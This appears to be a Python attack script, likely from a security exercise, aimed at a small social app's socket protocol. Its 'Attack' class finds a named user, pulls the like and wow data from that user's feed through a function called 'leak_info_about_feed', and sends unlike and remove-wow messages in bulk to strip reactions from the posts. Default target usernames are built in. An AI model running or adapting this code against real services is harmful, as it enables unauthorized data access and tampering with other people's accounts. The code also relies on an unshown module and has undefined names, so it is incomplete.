import datetime
from tools import *

class Attack(tools):

    _return_like = "LIKE"
    _return_wow = "WOW"
    user_id = 8017
    feed_owner_id = 8017
    date = datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%SZ")


    _get_feed = {"feed_owner_id":feed_owner_id,"end_date":date,"glit_count":2}


    @classmethod
    def leak_info_about_feed(cls, opt = "LIKE",target_name = "natalip", end_date = date, num_of_posts = 100) -> dict:
        # ---------------------------------------------- #
        # This function gets info about user's feed
        # :param opt: get like map or wow map
        # :type: str
        # :param target_name: the name of user to get his feed
        # :type target_name: str
        # :param end_date: max date to get info from
        # :type end_date: str
        # :param num_of_post: how post to get info of
        # :type num_of_post: int
        # :return: dictionary with like\wow info
        # :rtype: dict
        # ---------------------------------------------- #

        new_msg = cls._get_feed
        new_msg["feed_owner_id"] = super().find_user_id_by_name(super().server_session.sock, target_name)
        new_msg["end_date"] = end_date
        new_msg["glit_count"] = num_of_posts
        client_msg = super().build_get_feed_msg(new_msg)
        super().server_session.sock.sendall(client_msg.encode())
        server_msg = super().server_session.sock.recv(184048).decode()
        print(f"[INFO] The feed data is {server_msg}")
        data = server_msg[server_msg.find(cls._data_start) + len(cls._data_start): len(server_msg) - 3]
        data = json.loads(data)
        if opt == cls._return_like:
            data = data["likesMap"]["gestureMap"]
        else:
            data = data["wowsMap"]["gestureMap"]
        return data

    
    @classmethod
    def remove_likes_untill_specific_date(cls, target_name = "ricki ri", end_date = datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%SZ"), num_of_posts = 10) -> None:
        # ---------------------------------------------- #
        # This function removes likes from posts
        # :param target_name: the name of user to get his feed
        # :type target_name: str
        # :param end_date: max date to get info from
        # :type end_date: str
        # :param num_of_post: how post to get info of
        # :type num_of_post: int
        # :return: dictionary with like\wow info
        # :rtype: dict
        # ---------------------------------------------- #

        likes = cls.leak_info_about_feed(cls._return_like, target_name, end_date, num_of_posts)
        print(likes)
        for i in likes.values():
            for j in i:
                id = j["id"]
                client_msg = cls.build_unlike_msg(id)
                super().server_session.sock.sendall(client_msg.encode())
                server_msg = super().server_session.sock.recv(200048).decode()
                print(f"[INFO] {server_msg}")

    
    @classmethod
    def remove_wows_untill_specific_date(cls, target_name = "ricki ri", end_date = date, num_of_posts = 10) -> None:
        # ---------------------------------------------- #
        # This function removes wow from all posts
        # :param target_name: the name of user to get his feed
        # :type target_name: str
        # :param end_date: max date to get info from
        # :type end_date: str
        # :param num_of_post: how post to get info of
        # :type num_of_post: int
        # :return: dictionary with like\wow info
        # :rtype: dict
        # ---------------------------------------------- #

        likes = cls.leak_info_about_feed(cls._return_wow, target_name, end_date, num_of_posts)
        for i in likes.values():
            for j in i:
                id = j["id"]
                client_msg = cls.build_remove_wow_msg(id)
                super().server_session.sock.sendall(client_msg.encode())
                server_msg = super().server_session.sock.recv(200048).decode()
                print(f"[INFO] {server_msg}")
